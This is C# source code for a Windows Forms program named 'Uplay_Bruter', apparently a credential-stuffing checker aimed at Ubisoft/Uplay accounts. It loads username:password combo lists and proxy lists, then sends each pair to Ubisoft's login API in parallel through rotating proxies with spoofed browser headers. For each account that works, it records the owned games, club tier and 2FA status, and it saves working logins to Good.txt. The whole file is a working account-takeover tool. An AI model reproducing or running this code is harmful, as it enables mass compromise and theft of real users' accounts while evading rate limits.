using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using ThreadGun;
using System.Text.RegularExpressions;

namespace Uplay_Bruter
{
    public partial class Form1 : Form
    {

        List<string> Combo = new List<string>();
        List<string> Proxy = new List<string>();
        int Bad;
        int Good;
        int Error;
        int Remaining;
        int Checked;
        int Custom;
        int CPM;
        int seconds = 0;
        int minutes = 0;
        int hours = 0;
        string ResultTime;

        public enum Type
        {
            http,
            socks4,
            socks4a,
            socks5
        }
        public Type ProTy = Type.http;

        public Form1()
        {
            InitializeComponent();
            this.FormClosed += Form1_FormClosed;
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Process.GetCurrentProcess().Kill();
        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            lblThread.Text = "Thread: " + trackBar1.Value;
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBox1.SelectedIndex == 0)
            {
                ProTy = Type.http;
            }
            else if (comboBox1.SelectedIndex == 1)
            {
                ProTy = Type.socks5;
            }
            else if (comboBox1.SelectedIndex == 2)
            {
                ProTy = Type.socks4;
            }
            else
            {
                ProTy = Type.socks4a;
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                if (Combo.Count != 0)
                {
                    if (Proxy.Count != 0)
                    {
                        if (trackBar1.Value > Combo.Count)
                        {
                            trackBar1.Value = Combo.Count;
                            lblThread.Text = "Thread: " + trackBar1.Value;
                        }
                        if (Checked == 0 && Error == 0)
                        {
                            ResultTime = $"{DateTime.Now.ToString($"{0:yyyy-MM-dd}" + "---" + $"{0:HH-mm-ss}")}";
                            Directory.CreateDirectory("Checked in " + $"{ResultTime}");
                            timer1.Enabled = true;
                            new ThreadGun<string>(Config, Combo, (int)trackBar1.Value, Thr_Completed, null).FillingMagazine().Start();
                        }
                    }
                    else
                    {
                        MessageBox.Show("Please Load Proxy.", "Start");
                    }
                }
                else
                {
                    MessageBox.Show("Please Load Combo.", "Start");
                }
            }
            catch
            {
                timer1.Enabled = false;
                minutes = 0;
                seconds = 0;
                hours = 0;
                Directory.Delete("Checked in " + $"{ResultTime}");
                MessageBox.Show("Error To Start Checking.", "Start");
            }
        }

        private void btnCombo_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog Open = new OpenFileDialog();
                Open.Filter = "Select Combo |*.txt";
                Open.Multiselect = false;
                Open.Title = "Select Combo ";
                if (Open.ShowDialog() == DialogResult == false)
                {
                    Combo.Clear();
                    StreamReader sr = new StreamReader(Open.FileName);
                    while (!sr.EndOfStream)
                    {
                        try
                        {
                            string txt = sr.ReadLine();
                            char[] Spl = { ':' };
                            string[] Comb = txt.Split(Spl);
                            string Com = Comb[1];
                            for (int i = 2; i < Comb.Length; i++)
                            {
                                Com += ":" + Comb[i];
                            }
                            Combo.Add(Comb[0] + ":" + Com);
                        }
                        catch
                        {

                        }
                    }
                    sr.Close();
                    btnCombo.Text = Combo.Count.ToString();
                }
            }
            catch
            {
                MessageBox.Show("Error To Load Combo.", "Combo");
            }
        }

        private void btnProxy_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog Open = new OpenFileDialog();
                Open.Filter = "Select Proxy |*.txt";
                Open.Multiselect = false;
                Open.Title = "Select Proxy ";
                if (Open.ShowDialog() == DialogResult == false)
                {
                    Proxy.Clear();
                    Proxy.AddRange(File.ReadAllLines(Open.FileName));
                    btnProxy.Text = Proxy.Count.ToString();
                }
            }
            catch
            {
                MessageBox.Show("Error To Load Proxy.", "Proxy");
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            try
            {
                HttpRequest http = new HttpRequest();
                var result = http.Get(textBox1.Text).ToString();
                var Final = result.Split('\n');
                Proxy.Clear();
                Proxy.AddRange(Final);
                btnProxy.Text = Proxy.Count.ToString();
            }
            catch
            {
                MessageBox.Show("Error To Load Proxy.", "Proxy");
            }
        }

        private void Config(string line)
        {
            string User = line.Split(':')[0];
            string Pass = line.Split(':')[1];
            for (int i = 2; i < line.Split(':').Length; i++)
            {
                Pass += ":" + line.Split(':')[i];
            }
            First:
            try
            {
                int p = new Random().Next(Proxy.Count);
                CookieStorage cook = new CookieStorage();
                using(HttpRequest Web = new HttpRequest())
                {
                    string Enc = Convert.ToBase64String(Encoding.UTF8.GetBytes($"{User}:{Pass}"));
                    switch (ProTy)
                    {
                        case Type.http:
                            Web.Proxy = HttpProxyClient.Parse(Proxy[p]);
                            break;
                        case Type.socks5:
                            Web.Proxy = Socks5ProxyClient.Parse(Proxy[p]);
                            break;
                        case Type.socks4:
                            Web.Proxy = Socks4ProxyClient.Parse(Proxy[p]);
                            break;
                        case Type.socks4a:
                            Web.Proxy = Socks4AProxyClient.Parse(Proxy[p]);
                            break;
                    }
                    Web.AddHeader(HttpHeader.AcceptLanguage, "fa,en-US;q=0.9,en;q=0.8,fr;q=0.7,es;q=0.6");
                    Web.AddHeader(HttpHeader.Origin, "https://connect.ubisoft.com");
                    Web.AddHeader("genomeid", "85c31714-0941-4876-a18d-2c7e9dce8d40");
                    Web.AddHeader("sec-ch-ua", "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"");
                    Web.AddHeader("sec-ch-ua-mobile", "?0");
                    Web.AddHeader("sec-fetch-dest", "empty");
                    Web.AddHeader("sec-fetch-mode", "cors");
                    Web.AddHeader("sec-fetch-site", "cross-site");
                    Web.AddHeader("ubi-appid", "314d4fef-e568-454a-ae06-43e3bece12a6");
                    Web.AddHeader("ubi-requestedplatformtype", "uplay");
                    Web.Referer = "https://connect.ubisoft.com/";
                    Web.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36";
                    Web.Authorization = $"Basic {Enc}";
                    Web.AllowAutoRedirect = true;
                    Web.IgnoreProtocolErrors = true;
                    Web.UseCookies = true;
                    Web.Cookies = cook;
                    var Data = Web.Post("https://public-ubiservices.ubi.com/v3/profiles/sessions", "{\"rememberMe\":true}", "application/json");
                    if (Data.ToString().Contains("\"ticket\":\""))
                    {
                        string ticket = Regex.Match(Data.ToString(), "\"ticket\":\"(.*?)\"").Groups[1].Value;
                        string uid = Regex.Match(Data.ToString(), "\"userId\":\"(.*?)\"").Groups[1].Value;
                        Web.AddHeader(HttpHeader.Accept, "*/*");
                        Web.AddHeader("Ubi-AppId", "39baebad-39e5-4552-8c25-2c9b919064e2");
                        Web.AddHeader("GenomeId", "4f9d4adf-3646-4058-8553-c7b48df556e0");
                        Web.Authorization = $"Ubi_v1 t={ticket}";
                        Web.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        Web.AllowAutoRedirect = true;
                        Web.IgnoreProtocolErrors = true;
                        Web.UseCookies = true;
                        Web.Cookies = cook;
                        string Response = Web.Get($"https://public-ubiservices.ubi.com/v1/profiles/club?profileIds={uid}").ToString();
                        if (Response.Equals("[]"))
                        {
                            Custom++;
                            Checked++;
                            Remaining = Combo.Count - Checked;
                            lbltfa.Invoke(new MethodInvoker(delegate { lbltfa.Text = "Custom: " + Custom.ToString(); }));
                            lblCheck.Invoke(new MethodInvoker(delegate { lblCheck.Text = "Checked: " + Checked.ToString(); }));
                            lblRemain.Invoke(new MethodInvoker(delegate { lblRemain.Text = "Remaining: " + Remaining.ToString(); }));
                            StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Custom.txt", true);
                            sw.WriteLine($"{User}:{Pass} || Free");
                            sw.Close();
                        }
                        else
                        {
                            string units = Regex.Match(Response, "\"units\":(.*?),").Groups[1].Value;
                            string level = Regex.Match(Response, "\"levelNumber\":(.*?),").Groups[1].Value;
                            string tier = Regex.Match(Response, "\"tierName\":\"(.*?)\",").Groups[1].Value;
                            string ClubMember = Regex.Match(Response, "\"isClubMember\":(.*?),").Groups[1].Value;
                            Web.AddHeader(HttpHeader.Accept, "*/*");
                            Web.AddHeader("Ubi-AppId", "39baebad-39e5-4552-8c25-2c9b919064e2");
                            Web.AddHeader("GenomeId", "4f9d4adf-3646-4058-8553-c7b48df556e0");
                            Web.Authorization = $"Ubi_v1 t={ticket}";
                            Web.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            Web.AllowAutoRedirect = true;
                            Web.IgnoreProtocolErrors = true;
                            Web.UseCookies = true;
                            Web.Cookies = cook;
                            string Res = Web.Get($"https://wspuplay-ext.ubi.com/UplayServices/WinServices/GameClientServices.svc/REST/JSON/GetGamePlatformsByUserId/{uid}/en-US/?onlyOwned=true&rowsCount=-1&pCodeIssuer=PC&country=EN").ToString();
                            if (Res.Equals("{\"ItemList\":[],\"TotalCount\":0}"))
                            {
                                Custom++;
                                Checked++;
                                Remaining = Combo.Count - Checked;
                                lbltfa.Invoke(new MethodInvoker(delegate { lbltfa.Text = "Custom: " + Custom.ToString(); }));
                                lblCheck.Invoke(new MethodInvoker(delegate { lblCheck.Text = "Checked: " + Checked.ToString(); }));
                                lblRemain.Invoke(new MethodInvoker(delegate { lblRemain.Text = "Remaining: " + Remaining.ToString(); }));
                                StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Custom.txt", true);
                                sw.WriteLine($"{User}:{Pass} || Free");
                                sw.Close();
                            }
                            else
                            {
                                Match ga = Regex.Match(Res, "\"WebUrl\":\"(.*?)\"");
                                string Game = ga.Groups[1].Value;
                                Match pl = Regex.Match(Res, "\"PlatformCode\":\"(.*?)\"");
                                string Platform = pl.Groups[1].Value;
                                string[] sdd = {
                                    "WebUrl"
                                };
                                for (int i = 1; i < Res.Split(sdd, StringSplitOptions.None).Length; i++)
                                {
                                    ga = ga.NextMatch();
                                    Game += Environment.NewLine + ga.Groups[1].Value;
                                }
                                Web.AddHeader(HttpHeader.Accept, "*/*");
                                Web.AddHeader("Ubi-AppId", "39baebad-39e5-4552-8c25-2c9b919064e2");
                                Web.AddHeader("GenomeId", "4f9d4adf-3646-4058-8553-c7b48df556e0");
                                Web.Authorization = $"Ubi_v1 t={ticket}";
                                Web.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                                Web.AllowAutoRedirect = true;
                                Web.IgnoreProtocolErrors = true;
                                Web.UseCookies = true;
                                Web.Cookies = cook;
                                string Resp = Web.Get($"https://public-ubiservices.ubi.com/v2/profiles/me/2fa").ToString();
                                string TFA = Regex.Match(Resp, "\"active\":(.*?),").Groups[1].Value.ToString();
                                if (TFA.Equals("true"))
                                {
                                    Custom++;
                                    Checked++;
                                    Remaining = Combo.Count - Checked;
                                    lbltfa.Invoke(new MethodInvoker(delegate { lbltfa.Text = "Custom: " + Custom.ToString(); }));
                                    lblCheck.Invoke(new MethodInvoker(delegate { lblCheck.Text = "Checked: " + Checked.ToString(); }));
                                    lblRemain.Invoke(new MethodInvoker(delegate { lblRemain.Text = "Remaining: " + Remaining.ToString(); }));
                                    StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Custom.txt", true);
                                    sw.WriteLine($"{User}:{Pass}\n---------Details---------\nLevel: {level}\nTier: {tier}\nUnits: {units}\nClub Member: {ClubMember}\nGame:\n{Game}\nPlatform:\n{Platform}\n----------------------------------------------------");
                                    sw.Close();
                                }
                                else
                                {
                                    Good++;
                                    Checked++;
                                    Remaining = Combo.Count - Checked;
                                    lblGood.Invoke(new MethodInvoker(delegate { lblGood.Text = "Good: " + Good.ToString(); }));
                                    lblCheck.Invoke(new MethodInvoker(delegate { lblCheck.Text = "Checked: " + Checked.ToString(); }));
                                    lblRemain.Invoke(new MethodInvoker(delegate { lblRemain.Text = "Remaining: " + Remaining.ToString(); }));
                                    dataGridView1.Invoke(new MethodInvoker(delegate { dataGridView1.Rows.Add($"{User}", $"{Pass}"); }));
                                    StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Good.txt", true);
                                    sw.WriteLine($"-----------------Start-----------------\nUsername: {User}\nPassword: {Pass}\n{User}:{Pass}\n--------Capture---------\nLevel: {level}\nTier: {tier}\nUnits: {units}\nClub Member: {ClubMember}\nGame:\n{Game}\nPlatform:\n{Platform}\n-----------------End-----------------\n\n");
                                    sw.Close();
                                }
                            }
                        }
                    }
                    else if (Data.ToString().Contains("Invalid credentials"))
                    {
                        Bad++;
                        Checked++;
                        Remaining = Combo.Count - Checked;
                        lblBad.Invoke(new MethodInvoker(delegate { lblBad.Text = "Bad: " + Bad.ToString(); }));
                        lblCheck.Invoke(new MethodInvoker(delegate { lblCheck.Text = "Checked: " + Checked.ToString(); }));
                        lblRemain.Invoke(new MethodInvoker(delegate { lblRemain.Text = "Remaining: " + Remaining.ToString(); }));
                        StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Bad.txt", true);
                        sw.WriteLine($"{User}:{Pass}");
                        sw.Close();
                    }
                    else
                    {
                        Error++;
                        lblError.Invoke(new MethodInvoker(delegate { lblError.Text = "Error: " + Error.ToString(); }));
                        Thread.Sleep(2000);
                        goto First;
                    }
                }
            }
            catch
            {
                Error++;
                lblError.Invoke(new MethodInvoker(delegate { lblError.Text = "Error: " + Error.ToString(); }));
                Thread.Sleep(2000);
                goto First;
            }
        }

        private void Thr_Completed(IEnumerable<string> inputs)
        {
            timer1.Enabled = false;
            MessageBox.Show("Check Was Completed.", "Complet");
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (seconds == 59)
            {
                seconds = 0;
                if (minutes == 59)
                {
                    minutes = 0;
                    hours++;
                }
                else
                {
                    minutes++;
                }
            }
            else
            {
                seconds++;
            }
            if (minutes == 0 && hours == 0)
            {
                CPM = Checked;
            }
            else if (hours == 0)
            {
                CPM = ((Checked * 100) / ((minutes * 100) + (seconds * 100 / 60)));
            }
            else
            {
                CPM = ((Checked * 100) / ((((hours * 60) * 100) + (minutes * 100)) + (seconds * 100 / 60)));
            }
            lblMul.Text = (hours > 9 ? hours + "" : "0" + hours) + ":"
                + (minutes > 9 ? minutes + "" : "0" + minutes) + ":"
                + (seconds > 9 ? seconds + "" : "0" + seconds) + " / " + "CPM: " + CPM.ToString();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Process.Start("https://t.me/Ariaei_co");
        }
    }
}
